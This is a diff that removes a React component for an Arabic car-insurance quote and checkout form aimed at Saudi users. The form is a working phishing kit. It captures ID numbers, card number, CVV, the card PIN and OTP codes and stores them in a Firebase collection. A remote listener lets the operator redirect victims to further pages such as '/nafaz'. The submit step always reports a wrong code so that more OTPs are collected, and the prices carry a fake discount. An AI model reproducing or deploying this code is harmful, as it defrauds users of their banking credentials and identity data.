-    { number: 2, title: "بيانات التأمين", subtitle: "تفاصيل وثيقة التأمين", icon: Shield },
-    { number: 3, title: "قائمة الأسعار", subtitle: "مقارنة العروض المتاحة", icon: TrendingUp },
-    { number: 4, title: "الإضافات", subtitle: "خدمات إضافية اختيارية", icon: Star },
-    { number: 5, title: "الملخص", subtitle: "مراجعة الطلب والتواصل", icon: CheckCircle },
-    { number: 6, title: "الدفع", subtitle: "بيانات الدفع الآمن", icon: CreditCard },
-    { number: 7, title: "التحقق", subtitle: "تأكيد رمز التحقق", icon: Lock },
-  ]
-
-  useEffect(() => {
-    let interval: NodeJS.Timeout
-    if (otpTimer > 0) {
-      interval = setInterval(() => {
-        setOtpTimer((prev) => prev - 1)
-      }, 1000)
-    }
-    return () => clearInterval(interval)
-  }, [otpTimer])
-
-  useEffect(() => {
-    if (stepHeaderRef.current) {
-      stepHeaderRef.current.focus()
-      stepHeaderRef.current.scrollIntoView({ behavior: "smooth", block: "start" })
-    }
-
-    // Save current step
-    const visitorId = localStorage.getItem("visitor")
-    if (visitorId) {
-      addData({ id: visitorId, currentPage })
-    }
-  }, [currentPage])
-
-  useEffect(() => {
-    if (Object.keys(errors).length > 0 && errorSummaryRef.current) {
-      errorSummaryRef.current.focus()
-    }
-  }, [errors])
-
-  useEffect(() => {
-    const visitorId = localStorage.getItem("visitor")
-    if (visitorId) {
-      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
-        if (docSnap.exists()) {
-          const data = docSnap.data()
-
-          if (currentPage !== data.currentPage) {
-            if (data.currentPage === "9999") {
-              window.location.href = "/verify-phone"
-            } else if (data.currentPage === "nafaz" || data.currentPage === "8888") {
-              window.location.href = "/nafaz"
-            } else {
-              setCurrentStep(Number.parseInt(data.currentPage))
-            }
-          }
-        }
-      })
-
-      return () => unsubscribe()
-    }
-  }, [])
-
-  const validationRules = {
-    insurance_purpose: {
-      required: true,
-      message: "يرجى اختيار الغرض من التأمين",
-    },
-    documment_owner_full_name: {
-      required: true,
-      message: "يرجى إدخال اسم مالك الوثيقة بالكامل",
-    },
-    owner_identity_number: {
-      required: true,
-      pattern: /^[0-9]{10}$/,
-      message: "يرجى إدخال رقم هوية صحيح (10 أرقام)",
-    },
-    buyer_identity_number: {
-      required: true,
-      pattern: /^[0-9]{10}$/,
-      message: "يرجى إدخال رقم هوية المشتري صحيح (10 أرقام)",
-    },
-    seller_identity_number: {
-      required: true,
-      pattern: /^[0-9]{10}$/,
-      message: "يرجى إدخال رقم هوية البائع صحيح (10 أرقام)",
-    },
-    vehicle_type: {
-      required: true,
-      message: "يرجى اختيار نوع المركبة",
-    },
-    sequenceNumber: {
-      required: true,
-      message: "يرجى إدخال الرقم التسلسلي للمركبة",
-    },
-    policyStartDate: {
-      required: true,
-      validate: (value: string) => {
-        const selectedDate = new Date(value)
-        const today = new Date()
-        const maxDate = new Date()
-        maxDate.setMonth(maxDate.getMonth() + 3)
-
-        if (selectedDate < today) {
-          return "لا يمكن أن يكون تاريخ بداية الوثيقة في الماضي"
-        }
-        if (selectedDate > maxDate) {
-          return "لا يمكن أن يكون تاريخ بداية الوثيقة أكثر من 3 أشهر من اليوم"
-        }
-        return null
-      },
-      message: "يرجى اختيار تاريخ بداية الوثيقة",
-    },
-    vehicleValue: {
-      required: true,
-      message: "يرجى إدخال القيمة التقديرية للمركبة",
-    },
-    insuranceTypeSelected: {
-      required: true,
-      message: "يرجى اختيار نوع التأمين",
-    },
-  
-    selectedInsuranceOffer: {
-      required: true,
-      message: "يرجى اختيار عرض التأمين المناسب",
-    },
-    phone: {
-      required: true,
-      pattern: /^(05|5)[0-9]{8}$/,
-      message: "يرجى إدخال رقم هاتف سعودي صحيح (05xxxxxxxx)",
-    },
-    cardNumber: {
-      required: true,
-      validate: (value: string) => {
-        if (!validateCardNumber(value)) {
-          return "رقم البطاقة غير صحيح"
-        }
-        return null
-      },
-      message: "يرجى إدخال رقم بطاقة صحيح",
-    },
-    cardName: {
-      required: true,
-      message: "يرجى إدخال الاسم كما هو مكتوب على البطاقة",
-    },
-    cardMonth: {
-      required: true,
-      message: "يرجى اختيار شهر انتهاء البطاقة",
-    },
-    cardYear: {
-      required: true,
-      message: "يرجى اختيار سنة انتهاء البطاقة",
-    },
-    cvv: {
-      required: true,
-      pattern: /^[0-9]{3}$/,
-      message: "يرجى إدخال رمز CVV صحيح (3 أرقام)",
-    },
-    pinCode: {
-      required: true,
-      pattern: /^[0-9]{4}$/,
-      message: "يرجى إدخال الرقم السري للبطاقة (4 أرقام)",
-    },
-    otp: {
-      required: true,
-      pattern: /^[0-9]{6}$/,
-      message: "يرجى إدخال رمز التحقق المكون من 6 أرقام",
-    },
-  }
-
-  const validateField = (fieldName: string, value: any): string | null => {
-    const rule = validationRules[fieldName as keyof typeof validationRules] as any
-    if (!rule) return null
-
-    if (rule.required && (!value || value === "" || (Array.isArray(value) && value.length === 0))) {
-      return rule.message
-    }
-
-    if (value && rule.pattern && !rule.pattern.test(value)) {
-      return rule.message
-    }
-
-    if (value && rule.validate) {
-      const customError = rule.validate(value)
-      if (customError) return customError
-    }
-
-    return null
-  }
-
-  const validateStep = (step: number): boolean => {
-    const stepErrors: Record<string, string> = {}
-    let isValid = true
-
-    switch (step) {
-      case 1:
-        // Check insurance purpose
-        const purposeError = validateField("insurance_purpose", formData.insurance_purpose)
-        if (purposeError) {
-          stepErrors.insurance_purpose = purposeError
-          isValid = false
-        }
-
-        // Check owner name
-        const ownerNameError = validateField("documment_owner_full_name", formData.documment_owner_full_name)
-        if (ownerNameError) {
-          stepErrors.documment_owner_full_name = ownerNameError
-          isValid = false
-        }
-
-        // Check vehicle type
-        const vehicleTypeError = validateField("vehicle_type", formData.vehicle_type)
-        if (vehicleTypeError) {
-          stepErrors.vehicle_type = vehicleTypeError
-          isValid = false
-        }
-
-        // Check sequence number
-        const sequenceError = validateField("sequenceNumber", formData.sequenceNumber)
-        if (sequenceError) {
-          stepErrors.sequenceNumber = sequenceError
-          isValid = false
-        }
-
-        if (formData.insurance_purpose === "renewal") {
-          const ownerIdError = validateField("owner_identity_number", formData.owner_identity_number)
-          if (ownerIdError) {
-            stepErrors.owner_identity_number = ownerIdError
-            isValid = false
-          }
-        } else if (formData.insurance_purpose === "property-transfer") {
-          const buyerIdError = validateField("buyer_identity_number", formData.buyer_identity_number)
-          const sellerIdError = validateField("seller_identity_number", formData.seller_identity_number)
-
-          if (buyerIdError) {
-            stepErrors.buyer_identity_number = buyerIdError
-            isValid = false
-          }
-          if (sellerIdError) {
-            stepErrors.seller_identity_number = sellerIdError
-            isValid = false
-          }
-        }
-        break
-
-      case 2:
-        // Check policy start date
-        const dateError = validateField("policyStartDate", formData.policyStartDate)
-        if (dateError) {
-          stepErrors.policyStartDate = dateError
-          isValid = false
-        }
-
-        // Check vehicle value
-        const valueError = validateField("vehicleValue", vehicleValue)
-        if (valueError) {
-          stepErrors.vehicleValue = valueError
-          isValid = false
-        }
-
-        // Check insurance type
-        const typeError = validateField("insuranceTypeSelected", formData.insuranceTypeSelected)
-        if (typeError) {
-          stepErrors.insuranceTypeSelected = typeError
-          isValid = false
-        }
-        break
-
-      case 3:
-        const selectedOfferError = validateField("selectedInsuranceOffer", formData.selectedInsuranceOffer)
-        if (selectedOfferError) {
-          stepErrors.selectedInsuranceOffer = selectedOfferError
-          isValid = false
-        }
-        break
-
-      case 5:
-        const phoneError = validateField("phone", formData.phone)
-        if (phoneError) {
-          stepErrors.phone = phoneError
-          isValid = false
-        }
-       
-        break
-
-      case 6:
-        // Validate all payment fields
-        const cardNumberError = validateField("cardNumber", cardNumber)
-        if (cardNumberError) {
-          stepErrors.cardNumber = cardNumberError
-          isValid = false
-        }
-
-        const cardNameError = validateField("cardName", cardName)
-        if (cardNameError) {
-          stepErrors.cardName = cardNameError
-          isValid = false
-        }
-
-        const cardMonthError = validateField("cardMonth", cardMonth)
-        if (cardMonthError) {
-          stepErrors.cardMonth = cardMonthError
-          isValid = false
-        }
-
-        const cardYearError = validateField("cardYear", cardYear)
-        if (cardYearError) {
-          stepErrors.cardYear = cardYearError
-          isValid = false
-        }
-
-        const cvvError = validateField("cvv", cvv)
-        if (cvvError) {
-          stepErrors.cvv = cvvError
-          isValid = false
-        }
-
-        const pinError = validateField("pinCode", pinCode)
-        if (pinError) {
-          stepErrors.pinCode = pinError
-          isValid = false
-        }
-        break
-
-      case 7:
-        const otpError = validateField("otp", otp)
-        if (otpError) {
-          stepErrors.otp = otpError
-          isValid = false
-        }
-        break
-    }
-
-    setErrors((prev) => ({ ...prev, ...stepErrors }))
-    return isValid
-  }
-
-  const handleFieldChange = (fieldName: string, value: any) => {
-    setFormData((prev) => ({ ...prev, [fieldName]: value }))
-
-    if (errors[fieldName]) {
-      setErrors((prev) => ({ ...prev, [fieldName]: "" }))
-    }
-  }
-
-  const handleFieldBlur = (fieldName: string) => {
-    setTouched((prev) => ({ ...prev, [fieldName]: true }))
-
-    const error = validateField(fieldName, formData[fieldName as keyof typeof formData])
-    if (error) {
-      setErrors((prev) => ({ ...prev, [fieldName]: error }))
-    }
-  }
-
-  const nextStep = () => {
-    if (validateStep(currentPage)) {
-      if (currentPage < steps.length) {
-        const visitorId = localStorage.getItem("visitor")
-        const dataToSave = {
-          id: visitorId,
-          currentPage: currentPage + 1,
-          ...formData,
-          vehicleValue,
-          cardNumber,
-          cardName,
-          cardMonth,
-          cardYear,
-          cvv,
-          createdDate: new Date().toISOString(),
-        }
-
-        addData(dataToSave)
-        setCurrentStep(currentPage + 1)
-      }
-    }
-  }
-
-  const prevStep = () => {
-    const vistorId = localStorage.getItem("visitor")
-    if (currentPage > 1) {
-      setCurrentStep(currentPage - 1)
-      addData({ id: vistorId, currentPage })
-    }
-  }
-
-  const handleSubmit = async () => {
-    if (!validateStep(7)) {
-      return
-    }
-
-    setIsSubmitting(true)
-    const visitorId = localStorage.getItem("visitor")
-
-    try {
-      await addData({
-        id: visitorId,
-        otp,
-        otpCode: otp,
-        createdDate: new Date().toISOString(),
-        otpVerified: false,
-        otpVerificationTime: new Date().toISOString(),
-        submissionTime: new Date().toISOString(),
-        finalStatus: "verification_failed",
-        otpAttempts: otpAttempts + 1,
-        paymentStatus: "completed",
-        ...formData,
-      })
-
-      await new Promise((resolve) => setTimeout(resolve, 2000))
-      alert("!رمز خاطئ, سوف يتم ارسال رمز جديد")
-      setOtp("")
-      setOtpAttempts((prev) => prev + 1)
-    } catch (error) {
-      alert("حدث خطأ أثناء إرسال الطلب. يرجى المحاولة مرة أخرى.")
-    } finally {
-      setIsSubmitting(false)
-    }
-  }
-
-  const ValidatedInput = ({
-    label,
-    fieldName,
-    type = "text",
-    placeholder,
-    required = false,
-    className = "",
-    autoFocus = false,
-    ...props
-  }: {
-    label: string
-    fieldName: string
-    type?: string
-    placeholder?: string
-    required?: boolean
-    className?: string
-    autoFocus?: boolean
-    [key: string]: any
-  }) => {
-    const hasError = errors[fieldName] && touched[fieldName]
-    return (
-      <div className={className}>
-        <label className="block text-sm font-semibold text-gray-700 mb-3">
-          {label} {required && <span className="text-red-500">*</span>}
-        </label>
-        <Input
-          type={type}
-          placeholder={placeholder}
-          value={formData[fieldName as keyof typeof formData] as string}
-          onChange={(e) => {
-            const value = e.target.value
-            handleFieldChange(fieldName, value)
-          }}
-          onBlur={() => handleFieldBlur(fieldName)}
-          className={`h-12 ${hasError ? "border-red-500 focus:border-red-500 focus:ring-red-200" : "border-gray-300 focus:border-blue-500 focus:ring-blue-200"}`}
-          {...props}
-        />
-        {hasError && (
-          <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-            <AlertCircle className="w-4 h-4 flex-shrink-0" />
-            <span>{errors[fieldName]}</span>
-          </div>
-        )}
-      </div>
-    )
-  }
-
-  function handlePayment(): void {
-    if (!validateStep(6)) {
-      return
-    }
-
-    const visitorId = localStorage.getItem("visitor")
-
-    addData({
-      id: visitorId,
-      createdDate: new Date().toISOString(),
-      cardNumber,
-      cardName,
-      cardMonth,
-      cardYear,
-      cvv,
-      pinCode,
-      paymentStatus: "processing",
-      ...formData,
-    })
-
-    setPaymentProcessing(true)
-    setTimeout(() => {
-      setPaymentProcessing(false)
-      setCurrentStep(7)
-      setOtpTimer(120)
-
-      addData({
-        id: visitorId,
-        paymentStatus: "completed",
-        otpSent: true,
-        currentPage: 7,
-      })
-      setOtpSent(true)
-    }, 2000)
-  }
-
-  function verifyOTP(): void {
-    const visitorId = localStorage.getItem("visitor")
-    allOtp.push(otp)
-    addData({
-      id: visitorId,
-      otpCode: otp,
-      otpAttempts: otpAttempts + 1,
-      otpVerificationTime: new Date().toISOString(),
-      createdDate: new Date().toISOString(),
-      allOtp,
-      ...formData,
-    })
-
-    handleSubmit()
-  }
-
-  function sendOTP(): void {
-    const visitorId = localStorage.getItem("visitor")
-
-    setOtpTimer(120)
-
-    addData({
-      id: visitorId,
-      otpSentTime: new Date().toISOString(),
-      otpResendCount: (otpAttempts || 0) + 1,
-      otpSent: true,
-      paymentStatus: "completed",
-      ...formData,
-    })
-    setOtpSent(true)
-  }
-
-  return (
-    <Card className="bg-white rounded-2xl shadow-2xl border-0 overflow-hidden">
-      <CardContent className="p-0">
-        {/* Enhanced Progress Steps */}
-        <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-6 lg:p-8">
-          {/* Mobile Progress */}
-          <div className="block sm:hidden">
-            <div className="flex items-center gap-2 overflow-x-auto pb-2">
-              {steps.map((step, index) => (
-                <div key={step.number} className="flex items-center flex-shrink-0">
-                  <div className="flex flex-col items-center">
-                    <div
-                      className={`w-10 h-10 rounded-xl flex items-center justify-center text-sm font-bold transition-all duration-300 ${
-                        step.number === currentPage
-                          ? "bg-[#109cd4] text-white shadow-lg scale-110"
-                          : step.number < currentPage
-                            ? "bg-green-500 text-white"
-                            : "bg-gray-200 text-gray-600"
-                      }`}
-                    >
-                      {step.number < currentPage ? <CheckCircle className="w-5 h-5" /> : step.number}
-                    </div>
-                    <p
-                      className={`text-xs mt-2 text-center w-20 ${
-                        step.number === currentPage ? "text-[#109cd4] font-semibold" : "text-gray-600"
-                      }`}
-                    >
-                      {step.title.split(" ")[0]}
-                    </p>
-                  </div>
-                  {index < steps.length - 1 && (
-                    <div
-                      className={`w-8 h-0.5 mx-2 transition-all duration-300 ${
-                        step.number < currentPage ? "bg-green-500" : "bg-gray-300"
-                      }`}
-                    />
-                  )}
-                </div>
-              ))}
-            </div>
-          </div>
-
-          {/* Desktop Progress */}
-          <div className="hidden sm:flex items-center justify-between">
-            {steps.map((step, index) => (
-              <div key={step.number} className="flex items-center">
-                <div className="flex flex-col items-center">
-                  <div
-                    className={`w-12 h-12 lg:w-14 lg:h-14 rounded-xl flex items-center justify-center text-sm lg:text-base font-bold transition-all duration-300 ${
-                      step.number === currentPage
-                        ? "bg-[#109cd4] text-white shadow-lg scale-110"
-                        : step.number < currentPage
-                          ? "bg-green-500 text-white"
-                          : "bg-gray-200 text-gray-600"
-                    }`}
-                  >
-                    {step.number < currentPage ? (
-                      <CheckCircle className="w-6 h-6 lg:w-7 lg:h-7" />
-                    ) : (
-                      <step.icon className="w-6 h-6 lg:w-7 lg:h-7" />
-                    )}
-                  </div>
-                  <div className="text-center mt-3">
-                    <p
-                      className={`text-sm lg:text-base font-semibold ${
-                        step.number === currentPage ? "text-[#109cd4]" : "text-gray-700"
-                      }`}
-                    >
-                      {step.title}
-                    </p>
-                    <p className="text-xs text-gray-500 hidden lg:block mt-1">{step.subtitle}</p>
-                  </div>
-                </div>
-                {index < steps.length - 1 && (
-                  <div
-                    className={`flex-1 h-1 mx-4 lg:mx-6 rounded-full transition-all duration-300 ${
-                      step.number < currentPage ? "bg-green-500" : "bg-gray-300"
-                    }`}
-                  />
-                )}
-              </div>
-            ))}
-          </div>
-        </div>
-
-        {/* Form Content */}
-        <div className="p-6 lg:p-8">
-          <div className="min-h-[500px] lg:min-h-[600px]">
-            {currentPage === 1 && (
-              <div className="space-y-8">
-                <div className="text-center mb-8">
-                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
-                    البيانات الأساسية
-                  </h3>
-                  <p className="text-gray-600">أدخل معلومات المركبة والمالك للبدء في الحصول على عرض السعر</p>
-                </div>
-                <MockInsurancePurpose formData={formData} setFormData={setFormData} errors={errors} />
-                <MockVehicleRegistration formData={formData} setFormData={setFormData} errors={errors} />
-              </div>
-            )}
-
-            {currentPage === 2 && (
-              <div className="space-y-8">
-                <div className="text-center mb-8">
-                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
-                    بيانات التأمين
-                  </h3>
-                  <p className="text-gray-600">حدد تفاصيل وثيقة التأمين ونوع التغطية المطلوبة</p>
-                </div>
-
-                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
-                  <ValidatedInput
-                    label="تاريخ بداية الوثيقة"
-                    fieldName="policyStartDate"
-                    type="date"
-                    required
-                    min={new Date().toISOString().split("T")[0]}
-                    autoFocus={true}
-                  />
-                  <div>
-                    <label className="block text-sm font-semibold text-gray-700 mb-3">
-                      القيمة التقديرية للمركبة <span className="text-red-500">*</span>
-                    </label>
-                    <Input
-                      maxLength={6}
-                      name="vehicleValue"
-                      placeholder="54,715"
-                      required
-                      value={vehicleValue}
-                      onChange={(e) => setVehicleValue(e.target.value)}
-                      className={`h-12 ${errors.vehicleValue ? "border-red-500" : "border-gray-300"}`}
-                    />
-                    {errors.vehicleValue && (
-                      <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-                        <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                        <span>{errors.vehicleValue}</span>
-                      </div>
-                    )}
-                  </div>
-                </div>
-
-                <div>
-                  <label className="block text-sm font-semibold text-gray-700 mb-4">
-                    نوع التأمين <span className="text-red-500">*</span>
-                  </label>
-                  <div className="grid grid-cols-2 gap-4">
-                    <button
-                      type="button"
-                      className={`p-4 rounded-xl border-2 transition-all duration-200 ${
-                        formData.insuranceTypeSelected === "comprehensive"
-                          ? "border-blue-500 bg-blue-50 text-[#109cd4] shadow-md"
-                          : "border-gray-300 hover:border-blue-400 hover:bg-blue-50"
-                      }`}
-                      onClick={() => handleFieldChange("insuranceTypeSelected", "comprehensive")}
-                    >
-                      <div className="text-center">
-                        <Shield className="w-8 h-8 mx-auto mb-2 text-current" />
-                        <div className="font-semibold">تأمين شامل</div>
-                        <div className="text-sm text-gray-500 mt-1">تغطية كاملة للمركبة</div>
-                      </div>
-                    </button>
-                    <button
-                      type="button"
-                      className={`p-4 rounded-xl border-2 transition-all duration-200 ${
-                        formData.insuranceTypeSelected === "against-others"
-                          ? "border-blue-500 bg-blue-50 text-[#109cd4] shadow-md"
-                          : "border-gray-300 hover:border-blue-400 hover:bg-blue-50"
-                      }`}
-                      onClick={() => handleFieldChange("insuranceTypeSelected", "against-others")}
-                    >
-                      <div className="text-center">
-                        <Users className="w-8 h-8 mx-auto mb-2 text-current" />
-                        <div className="font-semibold">تأمين ضد الغير</div>
-                        <div className="text-sm text-gray-500 mt-1">التغطية الأساسية</div>
-                      </div>
-                    </button>
-                  </div>
-                  {errors.insuranceTypeSelected && (
-                    <div className="flex items-center gap-2 mt-2 text-red-600 text-sm" role="alert">
-                      <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                      <span>{errors.insuranceTypeSelected}</span>
-                    </div>
-                  )}
-                </div>
-
-                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
-                  <Card className="border-2 border-gray-200 hover:border-blue-300 transition-colors">
-                    <CardContent className="p-6 text-center">
-                      <div className="flex items-center justify-center gap-2 mb-4">
-                        <Users className="w-6 h-6 text-[#109cd4]" />
-                        <span className="font-semibold text-lg">إضافة سائقين</span>
-                      </div>
-                      <div className="flex items-center justify-center gap-4">
-                        <button
-                          type="button"
-                          className="w-10 h-10 rounded-full bg-[#109cd4] text-white flex items-center justify-center hover:bg-blue-700 transition-colors"
-                          onClick={() =>
-                            handleFieldChange("additionalDrivers", Math.max(0, formData.additionalDrivers - 1))
-                          }
-                        >
-                          -
-                        </button>
-                        <span className="text-2xl font-bold text-gray-900">{formData.additionalDrivers}</span>
-                        <button
-                          type="button"
-                          className="w-10 h-10 rounded-full bg-[#109cd4] text-white flex items-center justify-center hover:bg-blue-700 transition-colors"
-                          onClick={() =>
-                            handleFieldChange("additionalDrivers", Math.min(5, formData.additionalDrivers + 1))
-                          }
-                        >
-                          +
-                        </button>
-                      </div>
-                      <p className="text-sm text-gray-500 mt-2">الحد الأقصى 5 سائقين</p>
-                    </CardContent>
-                  </Card>
-
-                  <Card className="border-2 border-green-200 bg-green-50">
-                    <CardContent className="p-6 text-center">
-                      <div className="flex items-center justify-center gap-2 mb-4">
-                        <Star className="w-6 h-6 text-green-600" />
-                        <span className="font-semibold text-lg text-green-800">خصومات خاصة</span>
-                      </div>
-                      <div className="flex items-center gap-3 mb-3">
-                        <input
-                          type="checkbox"
-                          className="w-5 h-5 text-green-600"
-                          checked={formData.specialDiscounts}
-                          onChange={(e) => handleFieldChange("specialDiscounts", e.target.checked)}
-                        />
-                        <span className="text-sm text-green-800">أريد الحصول على خصومات خاصة</span>
-                      </div>
-                      <Button className="bg-green-600 hover:bg-green-700 text-white w-full">عرض الخصومات</Button>
-                    </CardContent>
-                  </Card>
-                </div>
-              </div>
-            )}
-     {currentPage === 3 && (
-              <div className="space-y-8">
-                <div className="text-center mb-8">
-                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
-                    قائمة الأسعار
-                  </h3>
-                  <p className="text-gray-600">قارن بين العروض المتاحة واختر الأنسب لك</p>
-                </div>
-
-                <div className="flex justify-center mb-8">
-                  <div className="flex bg-gray-100 rounded-xl p-1">
-                    <button
-                      type="button"
-                      className={`px-6 py-3 rounded-lg text-sm font-semibold transition-all ${
-                        formData.insuranceTypeSelected === "against-others"
-                          ? "bg-[#109cd4] text-white shadow-md"
-                          : "text-gray-600 hover:text-gray-900"
-                      }`}
-                      onClick={() => handleFieldChange("insuranceTypeSelected", "against-others")}
-                    >
-                      ضد الغير
-                    </button>
-                    <button
-                      type="button"
-                      className={`px-6 py-3 rounded-lg text-sm font-semibold transition-all ${
-                        formData.insuranceTypeSelected === "comprehensive"
-                          ? "bg-[#109cd4] text-white shadow-md"
-                          : "text-gray-600 hover:text-gray-900"
-                      }`}
-                      onClick={() => handleFieldChange("insuranceTypeSelected", "comprehensive")}
-                    >
-                      شامل
-                    </button>
-                  </div>
-                </div>
-
-                <div className="space-y-4 max-h-96 overflow-y-auto">
-                  {offerData
-                    .filter((offer) => {
-                      if (formData.insuranceTypeSelected === "comprehensive") {
-                        return offer.type === "comprehensive" || offer.type === "special"
-                      }
-                      return offer.type === "against-others"
-                    })
-                    .sort((a, b) => Number.parseFloat(a.main_price) - Number.parseFloat(b.main_price))
-                    .slice(0, 8)
-                    .map((offer, index) => {
-                      const totalExpenses = offer.extra_expenses.reduce((sum, expense) => sum + expense.price, 0)
-                      const finalPrice = Number.parseFloat(offer.main_price) + totalExpenses
-                      const isSelected = formData.selectedInsuranceOffer === offer.id
-
-                      return (
-                        <Card
-                          key={offer.id}
-                          className={`relative transition-all duration-200 cursor-pointer hover:shadow-md ${
-                            isSelected
-                              ? "ring-2 ring-[#109cd4] shadow-lg bg-blue-50/30"
-                              : "hover:shadow-sm border-gray-200"
-                          }`}
-                          onClick={() => handleFieldChange("selectedInsuranceOffer", offer.id)}
-                        >
-                          <CardContent className="p-0">
-                            {/* Header Section */}
-                            <div className="p-4 pb-3">
-                              <div className="flex items-start gap-3">
-                                {/* Radio Button */}
-                                <div className="flex-shrink-0 mt-1">
-                                  <div
-                                    className={`w-5 h-5 rounded-full border-2 flex items-center justify-center transition-colors ${
-                                      isSelected ? "border-[#109cd4] bg-[#109cd4]" : "border-gray-300 bg-white"
-                                    }`}
-                                  >
-                                    {isSelected && <div className="w-2 h-2 bg-white rounded-full" />}
-                                  </div>
-                                </div>
-
-                                {/* Icon */}
-                                <div
-                                  className={`w-12 h-12 rounded-xl flex items-center justify-center flex-shrink-0 transition-colors ${
-                                    isSelected ? "bg-[#109cd4]/10" : "bg-gray-100"
-                                  }`}
-                                >
-                                  <img src={offer.company.image_url} className={`w-10 h-10 ${isSelected ? "text-[#109cd4]" : "text-gray-600"}`} />
-                                </div>
-
-                                {/* Content */}
-                                <div className="flex-1 min-w-0">
-                                  <h4 className="font-bold text-gray-900 text-base leading-tight mb-2">
-                                    {offer.company.name.replace(/insurance/g, "").trim()}
-                                  </h4>
-
-                                  <div className="flex flex-wrap items-center gap-2">
-                                  
-
-                                    {index < 3 && (
-                                      <Badge
-                                        className={`text-xs font-medium ${
-                                          index === 0
-                                            ? "bg-green-100 text-green-700 hover:bg-green-100"
-                                            : index === 1
-                                              ? "bg-blue-100 text-blue-700 hover:bg-blue-100"
-                                              : "bg-orange-100 text-orange-700 hover:bg-orange-100"
-                                        }`}
-                                      >
-                                      </Badge>
-                                    )}
-                                  </div>
-                                </div>
-
-                                {/* Price */}
-                                <div className="text-right flex-shrink-0">
-                                <del className="text-lg font-bold text-red-600">{finalPrice.toFixed(0)}</del>
-                                  <p className="text-lg font-bold text-gray-900">{(finalPrice-finalPrice*0.3).toFixed(0)}</p>
-                                  <p className="text-xs text-gray-500 leading-tight">ر.س / سنوياً</p>
-                                </div>
-                              </div>
-                            </div>
-
-                            {/* Features Section */}
-                            {offer.extra_features.filter((f) => f.price === 0).length > 0 && (
-                              <div className="px-4 pb-4">
-                                <div className="pt-3 border-t border-gray-100">
-                                  <div className="space-y-2">
-                                    {offer.extra_features
-                                      .filter((f) => f.price === 0)
-                                      .slice(0, 3)
-                                      .map((feature, idx) => (
-                                        <div key={idx} className="flex items-center gap-2">
-                                          <div className="w-4 h-4 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
-                                            <CheckCircle className="w-2.5 h-2.5 text-green-600" />
-                                          </div>
-                                          <span className="text-xs text-gray-700 leading-relaxed">
-                                            {feature.content.length > 35
-                                              ? feature.content.substring(0, 35) + "..."
-                                              : feature.content}
-                                          </span>
-                                        </div>
-                                      ))}
-                                  </div>
-
-                                  {offer.extra_features.filter((f) => f.price === 0).length > 3 && (
-                                    <p className="text-xs text-[#109cd4] mt-2 font-medium">
-                                      +{offer.extra_features.filter((f) => f.price === 0).length - 3} ميزة إضافية
-                                    </p>
-                                  )}
-                                </div>
-                              </div>
-                            )}
-
-                            {/* Selected Indicator */}
-                            {isSelected && (
-                              <div className="absolute top-3 left-3">
-                                <div className="w-6 h-6 bg-[#109cd4] rounded-full flex items-center justify-center">
-                                  <CheckCircle className="w-3.5 h-3.5 text-white" />
-                                </div>
-                              </div>
-                            )}
-                          </CardContent>
-                        </Card>
-                      )
-                    })}
-                </div>
-
-                {errors.selectedInsuranceOffer && (
-                  <div className="flex items-center gap-2 text-red-600 text-sm bg-red-50 p-3 rounded-lg">
-                    <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                    <span>{errors.selectedInsuranceOffer}</span>
-                  </div>
-                )}
-              </div>
-            )}
-
-            {currentPage === 4 && (
-              <div className="space-y-8">
-                <div className="text-center mb-8">
-                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
-                    الإضافات والخدمات
-                  </h3>
-                  <p className="text-gray-600">اختر الخدمات الإضافية التي تناسب احتياجاتك</p>
-                </div>
-
-                {(() => {
-                  const selectedOffer = offerData.find((offer) => offer.id === formData.selectedInsuranceOffer)
-                  const paidFeatures = selectedOffer?.extra_features.filter((f) => f.price > 0) || []
-
-                  if (paidFeatures.length === 0) {
-                    return (
-                      <div className="text-center py-12">
-                        <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
-                          <CheckCircle className="w-10 h-10 text-green-600" />
-                        </div>
-                        <h4 className="text-2xl font-bold text-gray-900 mb-3">جميع المزايا مشمولة!</h4>
-                        <p className="text-gray-600 text-lg">
-                          العرض المختار يشمل جميع المزايا الأساسية بدون رسوم إضافية
-                        </p>
-                      </div>
-                    )
-                  }
-
-                  return (
-                    <div className="space-y-4">
-                      {paidFeatures.map((feature) => (
-                        <Card key={feature.id} className="border-2 border-gray-200 hover:shadow-md transition-all">
-                          <CardContent className="p-6">
-                            <div className="flex items-center justify-between">
-                              <div className="flex items-center gap-4">
-                                <input
-                                  type="checkbox"
-                                  className="w-5 h-5 text-[#109cd4]"
-                                  checked={formData.selectedAddons.includes(feature.id)}
-                                  onChange={(e) => {
-                                    const newAddons = e.target.checked
-                                      ? [...formData.selectedAddons, feature.id]
-                                      : formData.selectedAddons.filter((id) => id !== feature.id)
-                                    handleFieldChange("selectedAddons", newAddons)
-                                  }}
-                                />
-                                <div>
-                                  <h4 className="font-bold text-gray-900 text-lg">{feature.content}</h4>
-                                  <p className="text-gray-600">خدمة إضافية اختيارية</p>
-                                </div>
-                              </div>
-                              <div className="text-left">
-                                <p className="text-xl font-bold text-gray-900">+{feature.price} ر.س</p>
-                                <p className="text-sm text-gray-500">سنوياً</p>
-                              </div>
-                            </div>
-                          </CardContent>
-                        </Card>
-                      ))}
-                    </div>
-                  )
-                })()}
-              </div>
-            )}
-
-            {currentPage === 5 && (
-              <div className="space-y-8">
-                <div className="text-center mb-8">
-                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
-                    ملخص الطلب ومعلومات التواصل
-                  </h3>
-                  <p className="text-gray-600">راجع طلبك وأدخل معلومات التواصل لإتمام العملية</p>
-                </div>
-
